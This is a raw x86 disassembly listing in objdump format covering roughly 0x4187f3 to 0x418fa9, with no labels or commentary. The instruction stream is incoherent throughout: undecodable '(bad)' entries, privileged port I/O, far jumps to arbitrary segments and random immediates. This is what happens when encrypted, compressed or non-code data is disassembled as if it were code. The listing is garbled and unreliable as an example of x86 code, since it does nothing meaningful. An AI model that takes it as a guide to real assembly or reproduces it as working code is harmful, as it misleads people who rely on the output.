  4187f3:	and    BYTE PTR [ecx-0x30],bl
  4187f6:	sub    BYTE PTR [edi+0x6272bf2c],ch
  4187fc:	push   ss
  4187fd:	jae    0x418795
  4187ff:	ins    DWORD PTR es:[edi],dx
  418800:	jns    0x4187d8
  418802:	ja     0x4187de
  418804:	sbb    bh,BYTE PTR [ebp+0x4b]
  418807:	pop    ds
  418808:	add    eax,0x67604c89
  41880d:	or     eax,0x6dab27e5
  418812:	jns    0x41886c
  418814:	(bad)  
  418815:	or     eax,ecx
  418817:	mul    BYTE PTR [edi+0x4240c439]
  41881d:	sbb    al,0xb7
  41881f:	and    ebx,DWORD PTR ss:[edx]
  418822:	jp     0x418854
  418824:	and    al,0xba
  418826:	aas    
  418827:	mul    DWORD PTR [edx]
  418829:	sbb    al,0xc4
  41882b:	sbb    bh,bh
  41882d:	into   
  41882e:	inc    ebp
  41882f:	addr16 mov edi,0x5ed88ede
  418835:	cld    
  418836:	jno    0x418850
  418838:	mov    edx,0x6255d9b3
  41883d:	stos   BYTE PTR es:[edi],al
  41883e:	out    dx,al
  41883f:	mov    ch,cl
  418841:	mov    cl,0x8
  418843:	push   ss
  418844:	xor    ah,BYTE PTR [edi-0x153ac0ac]
  41884a:	xchg   edi,eax
  41884b:	dec    edx
  41884c:	or     edi,DWORD PTR [eax]
  41884e:	xchg   ebp,eax
  41884f:	or     eax,0x95665b9a
  418854:	enter  0x9da1,0xf4
  418858:	jb     0x41883f
  41885a:	fdivr  QWORD PTR ds:0x61837979
  418860:	aaa    
  418861:	loope  0x4187f1
  418863:	mov    bh,0x73
  418865:	inc    edx
  418866:	xor    eax,0x11472688
  41886b:	cmp    DWORD PTR [ebx-0x3d],esp
  41886e:	mov    ds:0x88ce3937,eax
  418873:	mov    BYTE PTR [eax-0x5fd89119],ah
  418879:	pop    edi
  41887a:	inc    edi
  41887b:	mov    ah,0xaf
  41887d:	imul   ecx,DWORD PTR [eax+0x1f4c8080],0xcc2e34dc
  418887:	jmp    0x5e6a509c
  41888c:	dec    esp
  41888d:	ss (bad) 
  41888f:	mov    ch,0x70
  418891:	adc    ah,BYTE PTR [ebp+0x90429be]
  418897:	push   es
  418898:	push   ebx
  418899:	fistp  DWORD PTR [esi]
  41889b:	mov    ebp,0xec59253c
  4188a0:	mov    ss,WORD PTR [ebp+0x4]
  4188a3:	lock cs in eax,0xc7
  4188a7:	dec    ebx
  4188a8:	mov    dh,BYTE PTR [esi]
  4188aa:	mov    esi,0x7a588d70
  4188af:	dec    esp
  4188b0:	jle    0x418833
  4188b2:	mov    eax,DWORD PTR [eax+esi*8-0x44563eb5]
  4188b9:	mov    cl,0xc5
  4188bb:	leave  
  4188bc:	mov    edx,0x288fd98c
  4188c1:	dec    edx
  4188c2:	lea    edx,[eax]
  4188c4:	retf   
  4188c5:	pop    eax
  4188c6:	int3   
  4188c7:	shr    BYTE PTR [esi-0x77],0x10
  4188cb:	test   eax,0xf8602e93
  4188d0:	mov    WORD PTR [ecx-0x1ee3bd0e],gs
  4188d6:	repz fldenv [esi-0x4f]
  4188da:	cdq    
  4188db:	dec    edi
  4188dc:	push   edx
  4188dd:	fld    TBYTE PTR ds:0x5daaf496
  4188e3:	aas    
  4188e4:	addr16 icebp 
  4188e6:	xor    dh,BYTE PTR [edx-0x17]
  4188e9:	dec    esp
  4188ea:	or     al,0xdd
  4188ec:	cld    
  4188ed:	aaa    
  4188ee:	sbb    ebx,DWORD PTR [esi]
  4188f0:	out    0xc8,al
  4188f2:	lods   eax,DWORD PTR ds:[esi]
  4188f3:	repnz pop es
  4188f5:	mov    dh,0x5a
  4188f7:	js     0x41887e
  4188f9:	adc    bl,ah
  4188fb:	push   ebp
  4188fc:	pop    ecx
  4188fd:	push   0x30772a70
  418902:	and    al,BYTE PTR [ebx+0x4d]
  418905:	xor    dl,ah
  418907:	or     BYTE PTR [esi+edi*8+0x24167a1a],bl
  41890e:	test   eax,0x1ace444d
  418913:	or     esi,DWORD PTR [eax+0x66eb95c7]
  418919:	jecxz  0x418949
  41891b:	and    DWORD PTR [eax-0x20732d43],0x6f6dd712
  418925:	push   ds
  418926:	or     BYTE PTR ds:0xdb58b501,0xbf
  41892d:	popa   
  41892e:	jb     0x4188d2
  418930:	scas   al,BYTE PTR es:[edi]
  418931:	mov    ch,0xa9
  418933:	data16 or al,0xbd
  418936:	sub    ebx,esp
  418938:	shl    BYTE PTR [ebx],0x44
  41893b:	js     0x418918
  41893d:	push   cs
  41893e:	mov    cl,0xd5
  418940:	xchg   ebp,eax
  418941:	xor    BYTE PTR [edx],bl
  418943:	jns    0x4188eb
  418945:	ficom  DWORD PTR [esi]
  418947:	lods   eax,DWORD PTR ds:[esi]
  418948:	pop    eax
  418949:	(bad)  
  41894a:	lods   al,BYTE PTR ds:[esi]
  41894b:	add    DWORD PTR [eax-0x5a595b68],0xfffffff0
  418952:	cmp    DWORD PTR [edi],ecx
  418954:	and    ah,BYTE PTR [eax]
  418956:	push   ds
  418957:	int3   
  418958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418959:	inc    edi
  41895a:	xor    ebp,esi
  41895c:	xor    al,0xb4
  41895e:	push   ebp
  41895f:	dec    ebp
  418960:	add    eax,0x4ebc18e5
  418965:	pop    edi
  418966:	xchg   ebp,eax
  418967:	dec    esp
  418968:	dec    ebp
  418969:	loope  0x4189a9
  41896b:	push   esp
  41896c:	sbb    BYTE PTR [eax-0x798821e5],0x32
  418973:	stos   BYTE PTR es:[edi],al
  418974:	clc    
  418975:	mov    ?,WORD PTR [ecx+0x1062aec4]
  41897b:	and    esp,DWORD PTR [ebx-0x60]
  41897e:	xchg   ebx,esp
  418980:	(bad)  
  418981:	jp     0x41891b
  418983:	ret    
  418984:	add    esp,ebx
  418986:	rcr    BYTE PTR [ebx+0x6d1c05d6],0xde
  41898d:	daa    
  41898e:	popa   
  41898f:	sahf   
  418990:	(bad)  
  418991:	sub    eax,0x923d838e
  418996:	stc    
  418997:	and    ecx,DWORD PTR [edx-0x565a2964]
  41899d:	inc    esp
  41899e:	jmp    0x6ffcc104
  4189a3:	xor    dl,BYTE PTR [eax+0x59]
  4189a6:	shl    cl,0x78
  4189a9:	cmp    BYTE PTR [edx-0x102a419a],bl
  4189af:	mov    edi,0x59d08d27
  4189b4:	xchg   esi,eax
  4189b5:	outs   dx,BYTE PTR ds:[esi]
  4189b6:	enter  0x39d8,0x49
  4189ba:	inc    esp
  4189bb:	pop    ebp
  4189bc:	adc    al,0x70
  4189be:	jae    0x418a12
  4189c0:	push   ebx
  4189c1:	inc    esi
  4189c2:	test   eax,0x1921dc6b
  4189c7:	or     eax,DWORD PTR [esi+eax*4+0x9]
  4189cb:	adc    al,BYTE PTR [ebx+eiz*4]
  4189ce:	xor    ch,BYTE PTR [ecx-0x3d]
  4189d1:	mov    bh,0xcc
  4189d3:	sbb    DWORD PTR [edi],eax
  4189d5:	int    0xb1
  4189d7:	mov    al,0x53
  4189d9:	imul   eax,DWORD PTR [ebx],0xffffffce
  4189dc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189de:	(bad)  
  4189df:	arpl   WORD PTR [edi+0x64f7f943],si
  4189e5:	retf   0xe62b
  4189e8:	(bad)  
  4189e9:	push   ecx
  4189ea:	jecxz  0x4189b4
  4189ec:	cdq    
  4189ed:	jg     0x418a3e
  4189ef:	mov    ebx,0x55abd223
  4189f4:	retf   
  4189f5:	jnp    0x418a60
  4189f7:	add    edx,esi
  4189f9:	add    ecx,esi
  4189fb:	in     al,0x36
  4189fd:	daa    
  4189fe:	fcom   DWORD PTR [edi]
  418a00:	sub    DWORD PTR [eax+0x3c],edx
  418a03:	loop   0x418a5e
  418a05:	addr16 dec esp
  418a07:	jl     0x41899e
  418a09:	fisub  WORD PTR [eax+0x7e]
  418a0c:	in     eax,0xa6
  418a0e:	addr16 jp 0x418a1d
  418a11:	jno    0x418a6c
  418a13:	call   0x3a95:0xaa6202c4
  418a1a:	push   edx
  418a1b:	sbb    al,0x3
  418a1d:	adc    BYTE PTR [esi+ebp*4-0x6c96bc43],bh
  418a24:	jb     0x418a82
  418a26:	enter  0xdbbf,0x80
  418a2a:	fs dec ebx
  418a2c:	inc    esp
  418a2d:	adc    ecx,ebx
  418a2f:	mov    ch,BYTE PTR [esp+esi*4-0x72]
  418a33:	retf   0xe252
  418a36:	xchg   bh,ch
  418a38:	cs das 
  418a3a:	mov    ebx,0x5c2fae96
  418a3f:	xchg   ebx,ebp
  418a41:	retf   
  418a42:	sbb    bl,0xc3
  418a45:	shl    eax,cl
  418a47:	icebp  
  418a48:	fadd   QWORD PTR [ebx]
  418a4a:	or     esi,DWORD PTR [ecx+0x3c09ece9]
  418a50:	ret    
  418a51:	inc    edx
  418a52:	lods   al,BYTE PTR ds:[esi]
  418a53:	mov    BYTE PTR [esi+edx*2],bl
  418a56:	imul   BYTE PTR [edi+0x50]
  418a59:	int3   
  418a5a:	dec    eax
  418a5b:	outs   dx,DWORD PTR ds:[esi]
  418a5c:	lds    edx,FWORD PTR [ecx+ebx*1+0x74]
  418a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a61:	retf   0x9fef
  418a64:	mov    al,ds:0xebce39b4
  418a69:	mov    ebp,0xce9beb4c
  418a6e:	std    
  418a6f:	mov    ah,0xaa
  418a71:	cmp    eax,0xee012901
  418a76:	ds jge 0x418ab8
  418a79:	push   edi
  418a7a:	jmp    0x5fa:0xddde8f3d
  418a81:	out    dx,al
  418a82:	call   0x86a7:0xfdbd9c7f
  418a89:	in     eax,dx
  418a8a:	or     al,0x51
  418a8c:	dec    ebx
  418a8d:	mov    al,ds:0xcfbfe027
  418a92:	xchg   DWORD PTR gs:[ecx-0x35b860af],esi
  418a99:	pop    ds
  418a9a:	dec    ecx
  418a9b:	dec    esp
  418a9c:	shr    BYTE PTR [edx+0x14],0xf3
  418aa0:	lea    eax,[eax+0x1]
  418aa3:	ror    esi,0x71
  418aa6:	adc    ah,cl
  418aa8:	jmp    0x77fb:0x1a723dde
  418aaf:	(bad)  
  418ab0:	push   cs
  418ab1:	pop    ax
  418ab3:	stos   DWORD PTR es:[edi],eax
  418ab4:	push   ecx
  418ab5:	mov    dl,0xb
  418ab7:	aaa    
  418ab8:	jmp    0xf36c:0xf76547a9
  418abf:	test   DWORD PTR [edx],edx
  418ac1:	sbb    DWORD PTR [edx+0x4a7ce783],edx
  418ac7:	lods   eax,DWORD PTR ds:[esi]
  418ac8:	dec    ecx
  418ac9:	sub    ebx,DWORD PTR ds:0x3aee24ed
  418acf:	scas   eax,DWORD PTR es:[edi]
  418ad0:	(bad)  
  418ad1:	clc    
  418ad2:	fimul  DWORD PTR ds:0x70f97359
  418ad8:	fcomp  DWORD PTR [ebp+0x42deca5d]
  418ade:	ins    BYTE PTR es:[edi],dx
  418adf:	aas    
  418ae0:	mov    bl,0xe2
  418ae2:	scas   al,BYTE PTR es:[edi]
  418ae3:	inc    edi
  418ae4:	dec    ecx
  418ae5:	inc    BYTE PTR [ecx-0x38]
  418ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ae9:	arpl   WORD PTR [edx+0x1c],bp
  418aec:	sub    DWORD PTR ds:0x650892a3,ebx
  418af2:	add    BYTE PTR [esi-0x1a],ah
  418af5:	push   cs
  418af6:	cld    
  418af7:	add    bh,BYTE PTR [esi]
  418af9:	inc    ah
  418afb:	loop   0x418a9c
  418afd:	jp     0x418b77
  418aff:	mov    ebp,0xa721442
  418b04:	dec    esi
  418b05:	fs sbb eax,0x46c35685
  418b0b:	enter  0x8f0b,0x77
  418b0f:	out    0x9e,al
  418b11:	lds    esp,FWORD PTR [ebx]
  418b13:	or     ah,dl
  418b15:	mov    bl,0xf1
  418b17:	mov    ebx,0x5eec9ee7
  418b1c:	sar    DWORD PTR [ebx],cl
  418b1e:	data16 xor al,0x6b
  418b21:	lock or eax,ebp
  418b24:	mov    ebx,0xfab5503b
  418b29:	and    eax,0x58f38f91
  418b2e:	scas   al,BYTE PTR es:[edi]
  418b2f:	mov    edi,DWORD PTR [ecx+eiz*8+0x75]
  418b33:	jle    0x418abe
  418b35:	enter  0x9a35,0x76
  418b39:	fmul   DWORD PTR [ecx]
  418b3b:	addr16 (bad) 
  418b3d:	ss pop ebp
  418b3f:	inc    eax
  418b40:	or     dl,BYTE PTR [esi-0x7b]
  418b43:	mov    ebx,0x643a2028
  418b48:	add    ebp,DWORD PTR [esi]
  418b4a:	inc    edi
  418b4b:	mov    edx,0x4d7f64d6
  418b50:	adc    esi,DWORD PTR [edx+ebx*4]
  418b53:	idiv   DWORD PTR [ecx]
  418b55:	mov    cl,ah
  418b57:	dec    eax
  418b58:	adc    dh,BYTE PTR [edx+0x65]
  418b5b:	and    DWORD PTR [edx-0x53],0x10
  418b5f:	pop    esp
  418b60:	sub    DWORD PTR [ebp-0x3b],edi
  418b63:	jmp    0x418b74
  418b65:	clc    
  418b66:	int    0xdb
  418b68:	mov    ah,0xbc
  418b6a:	fidivr WORD PTR [ebx-0x41]
  418b6d:	xchg   edi,eax
  418b6e:	scas   al,BYTE PTR es:[edi]
  418b6f:	fs nop
  418b71:	pop    es
  418b72:	mov    dl,0xd4
  418b74:	mov    cl,0x97
  418b76:	sub    eax,edi
  418b78:	rol    DWORD PTR [eax-0x311e70e8],cl
  418b7e:	adc    eax,0x9a895f34
  418b83:	das    
  418b84:	ret    
  418b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b86:	leave  
  418b87:	aas    
  418b88:	in     eax,0x59
  418b8a:	adc    BYTE PTR [esp+ebx*4-0x46362b85],0xe4
  418b92:	xchg   DWORD PTR [eax],esp
  418b94:	xchg   edi,eax
  418b95:	sub    DWORD PTR [esp+eax*2-0x340ebef4],esi
  418b9c:	fistp  WORD PTR [edx+edx*4-0x52d02b83]
  418ba3:	sub    eax,0x2d351ce
  418ba8:	sub    al,BYTE PTR [eax+0x2d]
  418bab:	rcl    edi,cl
  418bad:	out    0xd8,eax
  418baf:	push   edi
  418bb0:	push   ss
  418bb1:	cli    
  418bb2:	and    BYTE PTR [esi-0x4a],ch
  418bb5:	aam    0x84
  418bb7:	int    0x51
  418bb9:	rcl    cl,0x52
  418bbc:	dec    esi
  418bbd:	std    
  418bbe:	std    
  418bbf:	dec    ebp
  418bc0:	in     eax,dx
  418bc1:	cli    
  418bc2:	mov    ebp,0xa5614fed
  418bc7:	xor    al,0x51
  418bc9:	jmp    0x418c05
  418bcb:	in     eax,dx
  418bcc:	mov    esi,0x218b7427
  418bd1:	cmp    BYTE PTR [ecx+edi*2+0x11],0xe3
  418bd6:	(bad)  
  418bd7:	test   eax,0x35aee708
  418bdc:	mov    WORD PTR [esi+0x75],ds
  418bdf:	xor    BYTE PTR [edx-0x65639f75],ch
  418be5:	imul   ebp,DWORD PTR [edx-0x42b13f02],0xd36540f4
  418bef:	dec    edx
  418bf0:	into   
  418bf1:	(bad)  
  418bf2:	adc    bl,dh
  418bf4:	fsub   DWORD PTR [ecx+0x3761abd3]
  418bfa:	push   ebp
  418bfb:	push   0x6f5183c
  418c00:	sti    
  418c01:	repnz int3 
  418c03:	ins    BYTE PTR es:[edi],dx
  418c04:	je     0x418be4
  418c06:	mov    cl,0x67
  418c08:	jo     0x418bce
  418c0a:	mov    edx,0x71beb6ae
  418c0f:	and    eax,DWORD PTR [edx]
  418c11:	mov    edx,0xc2160f1f
  418c16:	mov    BYTE PTR [esi],dh
  418c18:	das    
  418c19:	xchg   ebx,eax
  418c1a:	and    edx,DWORD PTR [eax]
  418c1c:	lahf   
  418c1d:	add    ebp,esi
  418c1f:	xor    DWORD PTR [edi-0x44c42970],ebx
  418c25:	dec    esi
  418c26:	ja     0x418bbb
  418c28:	out    dx,eax
  418c29:	pusha  
  418c2a:	dec    esp
  418c2b:	jnp    0x418c78
  418c2d:	nop
  418c2e:	pop    ss
  418c2f:	loop   0x418bdf
  418c31:	inc    ebx
  418c32:	inc    eax
  418c33:	mov    dl,0x2b
  418c35:	sub    esp,eax
  418c37:	outs   dx,BYTE PTR ds:[esi]
  418c38:	loopne 0x418c64
  418c3a:	fmul   QWORD PTR [ebp-0x58e72f7e]
  418c40:	sub    DWORD PTR [edx],esi
  418c42:	imul   ecx,DWORD PTR [edi+0x2c806f0],0x61
  418c49:	addr16 jg 0x418c7e
  418c4c:	mov    al,0x98
  418c4e:	ds push esi
  418c50:	pushf  
  418c51:	scas   al,BYTE PTR es:[edi]
  418c52:	out    0x66,eax
  418c54:	jo     0x418c51
  418c56:	sub    ah,BYTE PTR [ebx-0x61]
  418c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5a:	cmp    BYTE PTR [eax],dh
  418c5c:	(bad)  
  418c5d:	push   eax
  418c5e:	in     eax,0xa9
  418c60:	stos   BYTE PTR es:[edi],al
  418c61:	ja     0x418bfa
  418c63:	push   eax
  418c64:	clc    
  418c65:	and    dh,bh
  418c67:	mov    ecx,0x79fcaff0
  418c6c:	push   eax
  418c6d:	sbb    eax,0x9a9f3ccc
  418c72:	push   esi
  418c73:	cs push ds
  418c75:	fdivr  QWORD PTR [edi+0x325dd066]
  418c7b:	daa    
  418c7c:	adc    DWORD PTR [ebx-0x51],ebx
  418c7f:	inc    esi
  418c80:	inc    edx
  418c81:	jae    0x418c42
  418c83:	fild   DWORD PTR [edx-0x62]
  418c86:	lock and BYTE PTR [eax],0x9e
  418c8a:	inc    esp
  418c8b:	add    dh,BYTE PTR [eax+eiz*4+0x78b37bce]
  418c92:	push   cs
  418c93:	push   ebx
  418c94:	loop   0x418cd5
  418c96:	mov    bh,0xb5
  418c98:	mov    ecx,0x46aa4696
  418c9d:	cdq    
  418c9e:	jecxz  0x418c56
  418ca0:	push   es
  418ca1:	adc    eax,0x90298093
  418ca6:	outs   dx,DWORD PTR ds:[esi]
  418ca7:	and    DWORD PTR [ebx+0x44],edx
  418caa:	test   al,0x29
  418cac:	mov    WORD PTR [esi+0x2db3b9de],?
  418cb2:	arpl   WORD PTR [edx-0x47],dx
  418cb5:	sahf   
  418cb6:	bswap  ebp
  418cb8:	add    al,0x97
  418cba:	pop    esp
  418cbb:	pmaxsw mm3,mm5
  418cbe:	retf   0x97b8
  418cc1:	inc    esi
  418cc2:	mov    al,ds:0x43ded661
  418cc7:	fmul   st,st(1)
  418cc9:	(bad)  
  418cca:	hlt    
  418ccb:	mov    ds:0xd4b51d54,al
  418cd0:	sbb    ebx,eax
  418cd2:	and    BYTE PTR [esi],bl
  418cd4:	cdq    
  418cd5:	xor    ch,BYTE PTR [ebp-0xede15f9]
  418cdb:	rcl    DWORD PTR [esi],1
  418cdd:	xchg   di,ax
  418cdf:	xor    al,0x39
  418ce1:	jns    0x418c77
  418ce3:	sti    
  418ce4:	fistp  DWORD PTR [edx]
  418ce6:	cmp    ch,BYTE PTR [ebp+eiz*4+0x43]
  418cea:	pop    es
  418ceb:	add    ecx,esi
  418ced:	push   cs
  418cee:	imul   ebx,edi,0x7
  418cf1:	fmul   DWORD PTR [ecx-0x17e0e984]
  418cf7:	push   es
  418cf8:	jp     0x418d3b
  418cfa:	push   0x5
  418cfc:	push   esp
  418cfd:	dec    DWORD PTR [edx-0x58e2ebd3]
  418d03:	sbb    ebx,DWORD PTR [ebp+0x34]
  418d06:	stos   BYTE PTR es:[edi],al
  418d07:	add    eax,0x5bedf614
  418d0c:	or     cl,dl
  418d0e:	sub    esi,DWORD PTR [esi]
  418d10:	test   dh,bh
  418d12:	pop    ecx
  418d13:	push   edx
  418d14:	or     ah,dh
  418d16:	gs push esp
  418d18:	cdq    
  418d19:	xchg   bl,cl
  418d1b:	adc    edi,DWORD PTR [edi]
  418d1d:	pop    ecx
  418d1e:	sbb    BYTE PTR [ebx+0x15],ch
  418d21:	pop    esp
  418d22:	mov    ds:0xf7babf38,eax
  418d27:	sti    
  418d28:	bound  ebp,QWORD PTR [ecx+0x42]
  418d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d2c:	pop    ebx
  418d2d:	sbb    dh,BYTE PTR [edi-0xa41bc73]
  418d33:	jmp    0x284e:0xb4e2d744
  418d3a:	jno    0x418d8a
  418d3c:	je     0x418cfb
  418d3e:	pop    ecx
  418d3f:	mov    cl,0x8b
  418d41:	fidivr WORD PTR [edx]
  418d43:	shl    DWORD PTR [eax],cl
  418d45:	pop    edi
  418d46:	sbb    DWORD PTR [edi+0x7d],edx
  418d49:	mov    ds:0x932cb953,eax
  418d4e:	out    0x99,eax
  418d50:	mov    ah,0x58
  418d52:	mov    cl,0x4d
  418d54:	xor    BYTE PTR [ebp+0x6ee267cf],0xbf
  418d5b:	ret    0x8241
  418d5e:	ret    
  418d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d60:	xchg   DWORD PTR [edx],edx
  418d62:	mov    al,0xca
  418d64:	jmp    0x418dac
  418d66:	sub    edx,DWORD PTR [esi+0x30eb3ce1]
  418d6c:	pop    edi
  418d6d:	fs popf 
  418d6f:	out    0x5f,al
  418d71:	ficom  WORD PTR [edx+0x5a27e1c7]
  418d77:	push   esp
  418d78:	push   esi
  418d79:	dec    esp
  418d7a:	jnp    0x418d33
  418d7c:	push   esi
  418d7d:	push   edx
  418d7e:	leave  
  418d7f:	push   es
  418d80:	push   eax
  418d81:	shl    ebx,0xcf
  418d84:	cmp    BYTE PTR [edi+0x6f4f3584],bh
  418d8a:	aas    
  418d8b:	push   ds
  418d8c:	xor    al,0xbc
  418d8e:	inc    esi
  418d8f:	xchg   edx,eax
  418d90:	leave  
  418d91:	push   0x44
  418d93:	mov    esp,0x609ab532
  418d98:	jae    0x418db0
  418d9a:	test   BYTE PTR [edi],al
  418d9c:	sub    al,0x45
  418d9e:	imul   ebp,DWORD PTR [ebx],0x54
  418da1:	adc    ebx,ecx
  418da3:	mov    ch,0x21
  418da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da6:	mov    ebx,0x70d23dae
  418dab:	enter  0xb5b1,0x14
  418daf:	mov    WORD PTR [esi],fs
  418db1:	(bad)  
  418db3:	and    dl,BYTE PTR [ebp-0x54]
  418db6:	lea    ebx,[edx+edx*8]
  418db9:	hlt    
  418dba:	mov    al,BYTE PTR [esi+ebx*4+0x34]
  418dbe:	pop    esp
  418dbf:	mov    eax,ds:0x847567c1
  418dc4:	mov    cl,BYTE PTR [edx]
  418dc6:	dec    eax
  418dc7:	mov    edi,0xdfe958d1
  418dcc:	int3   
  418dcd:	mov    al,BYTE PTR [esi+esi*2+0x6bd3beda]
  418dd4:	les    edi,FWORD PTR [ebx]
  418dd6:	(bad)  
  418dd8:	dec    ebx
  418dd9:	repnz mov WORD PTR [eax-0xd],fs
  418ddd:	dec    edx
  418dde:	xchg   ecx,eax
  418ddf:	push   esi
  418de0:	mov    ah,0xdd
  418de2:	mov    eax,ds:0xa66b0f50
  418de7:	hlt    
  418de8:	push   eax
  418de9:	into   
  418dea:	adc    al,0x75
  418dec:	jg     0x418e67
  418dee:	cmovnp eax,DWORD PTR [edx+edi*1]
  418df2:	sub    DWORD PTR [eax-0x11],0x1
  418df6:	mov    edx,0x83b50db4
  418dfb:	xchg   ebp,eax
  418dfc:	sub    eax,0xe3b76c29
  418e01:	dec    BYTE PTR [edi-0xe289cc]
  418e07:	lahf   
  418e08:	into   
  418e09:	aad    0x2b
  418e0b:	sub    cl,BYTE PTR [esi+0x376ea965]
  418e11:	and    ch,BYTE PTR [esi+0x48]
  418e14:	push   ecx
  418e15:	test   al,0xf9
  418e17:	fstp   TBYTE PTR [ebp-0x47]
  418e1a:	sub    eax,0xac5efd33
  418e1f:	pop    ecx
  418e20:	xor    DWORD PTR [ebx+0x67],esi
  418e23:	jl     0x418dba
  418e25:	adc    eax,0x763f2df
  418e2a:	out    0x8,al
  418e2c:	lods   eax,DWORD PTR ds:[esi]
  418e2d:	or     al,0x7
  418e2f:	shr    DWORD PTR [ebp-0x79],0x34
  418e33:	jmp    0xd186:0xe2695b0a
  418e3a:	loopne 0x418e18
  418e3c:	adc    DWORD PTR [eax],0x5
  418e3f:	lds    edi,FWORD PTR [esi-0x6ce1915a]
  418e45:	fadd   QWORD PTR [edi+0x65ee60c]
  418e4b:	int3   
  418e4c:	push   eax
  418e4d:	add    eax,DWORD PTR [ebx]
  418e4f:	push   ds
  418e50:	hlt    
  418e51:	jle    0x418dd3
  418e53:	add    ebp,DWORD PTR [edi+0xe]
  418e56:	dec    ebx
  418e57:	je     0x418ea8
  418e59:	pop    ss
  418e5a:	lahf   
  418e5b:	xlat   BYTE PTR ds:[ebx]
  418e5c:	mov    dh,0xe4
  418e5e:	popa   
  418e5f:	sub    bl,BYTE PTR [edx]
  418e61:	cmp    DWORD PTR [edx+0x7fc2a259],edi
  418e67:	dec    ebx
  418e68:	jmp    0x418dff
  418e6a:	sub    ch,bh
  418e6c:	inc    ecx
  418e6d:	es rol ah,0xc9
  418e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e72:	push   eax
  418e73:	inc    eax
  418e74:	sub    eax,0xc701ef72
  418e79:	std    
  418e7a:	sub    al,0xf2
  418e7c:	arpl   WORD PTR [esi],cx
  418e7e:	daa    
  418e7f:	pop    ecx
  418e80:	(bad)  
  418e81:	and    eax,0xe95a088b
  418e86:	push   ebx
  418e87:	mov    ebp,0xa79dc328
  418e8c:	in     eax,dx
  418e8d:	test   edx,ecx
  418e8f:	cmp    al,0xf0
  418e91:	inc    ebp
  418e92:	inc    ebp
  418e93:	mov    eax,ds:0x33cee06d
  418e98:	(bad)  
  418e99:	xchg   ebp,eax
  418e9a:	push   0xffffffa8
  418e9c:	dec    ebx
  418e9d:	sti    
  418e9e:	mov    ds:0x3e64bf4a,eax
  418ea3:	fistp  WORD PTR [eax-0x1a]
  418ea6:	sub    esp,DWORD PTR [edx]
  418ea8:	or     ebp,ecx
  418eaa:	xor    eax,0x1d80c526
  418eaf:	in     al,dx
  418eb0:	xchg   esi,eax
  418eb1:	sbb    edi,0xffffff9b
  418eb4:	jmp    0x418f13
  418eb6:	pop    edi
  418eb7:	mov    ds:0xe9d9be6e,eax
  418ebc:	mov    edi,?
  418ebe:	test   DWORD PTR [edx+0x6b98735d],ecx
  418ec4:	jae    0x418ea2
  418ec6:	push   ss
  418ec7:	enter  0x56ff,0xc2
  418ecb:	sbb    al,0x65
  418ecd:	sub    DWORD PTR [ebp+ebx*1+0x61],ebp
  418ed1:	xor    dl,dl
  418ed3:	ja     0x418f13
  418ed5:	sub    dh,ah
  418ed7:	cmp    bh,ah
  418ed9:	mov    ebp,0x84579224
  418ede:	cmp    dl,BYTE PTR [edi+0x38]
  418ee1:	or     BYTE PTR [edi+0x3c28c226],ch
  418ee7:	and    al,0x88
  418ee9:	ins    BYTE PTR es:[edi],dx
  418eea:	pop    ecx
  418eeb:	fdivr  st(5),st
  418eed:	retf   
  418eee:	sti    
  418eef:	(bad)  
  418ef0:	test   DWORD PTR [eax],0x923ed2ec
  418ef6:	in     eax,0x7c
  418ef8:	mov    dh,cl
  418efa:	cmp    al,0x1f
  418efc:	pop    ss
  418efd:	mov    bh,0x38
  418eff:	add    esi,DWORD PTR [ebp-0x5b477704]
  418f05:	cmc    
  418f06:	or     al,0x9e
  418f08:	(bad)  
  418f09:	mov    esp,0x246524db
  418f0e:	test   DWORD PTR [edi],ecx
  418f10:	inc    ebp
  418f11:	shl    DWORD PTR [eax-0x2e],cl
  418f14:	or     cl,BYTE PTR [eax+eiz*1]
  418f17:	mov    ds:0x36a98a15,eax
  418f1c:	dec    esi
  418f1d:	mov    eax,0xe9c14ff5
  418f22:	adc    bl,ah
  418f24:	scas   al,BYTE PTR es:[edi]
  418f25:	cmp    DWORD PTR [edx+0x703d0960],edi
  418f2b:	aad    0x25
  418f2d:	sbb    DWORD PTR [ebx+ecx*1+0x28],esp
  418f31:	inc    eax
  418f32:	rcl    DWORD PTR [eax+eax*8],cl
  418f35:	out    dx,al
  418f36:	leave  
  418f37:	push   ebx
  418f38:	mov    eax,DWORD PTR [edx+0x29d7f4e1]
  418f3e:	mov    ecx,DWORD PTR [ebx-0xa8c2685]
  418f44:	pop    es
  418f45:	sahf   
  418f46:	sub    eax,0xc85c5813
  418f4b:	(bad)  
  418f4c:	jbe    0x418f09
  418f4e:	fs loopne 0x418f10
  418f51:	cmp    BYTE PTR [ebp+0x28],dh
  418f54:	hlt    
  418f55:	mov    cl,0x87
  418f57:	inc    ebx
  418f58:	sub    ecx,DWORD PTR [edx-0x40]
  418f5b:	mov    DWORD PTR cs:[esi+0x14],ebx
  418f5f:	sbb    ch,BYTE PTR [eax-0x21d4c479]
  418f65:	ja     0x418ef4
  418f67:	std    
  418f68:	test   DWORD PTR [edx+0x7d5c9cf8],ebx
  418f6e:	sub    edi,DWORD PTR [edx+0x3c]
  418f71:	imul   ecx,DWORD PTR [ebx-0x13],0x357a88e6
  418f78:	pop    ebx
  418f79:	inc    edx
  418f7a:	or     DWORD PTR [esi+edx*1-0x15],ebp
  418f7e:	in     eax,0x6b
  418f80:	jno    0x418f0b
  418f82:	cmp    DWORD PTR [eax+0x17b01231],edx
  418f88:	das    
  418f89:	retf   0xbb81
  418f8c:	pop    es
  418f8d:	pop    edx
  418f8e:	mov    ch,0xc1
  418f90:	inc    esi
  418f91:	push   0x28
  418f93:	mul    dl
  418f95:	neg    DWORD PTR [esi+0x6]
  418f98:	loopne 0x418f66
  418f9a:	sub    ch,0xab
  418f9d:	sti    
  418f9e:	or     esi,eax
  418fa0:	cwde   
  418fa1:	jle    0x418f47
  418fa3:	jb     0x418fd1
  418fa5:	test   al,0xfa
  418fa7:	test   al,0xb9
  418fa9:	dec    ebp
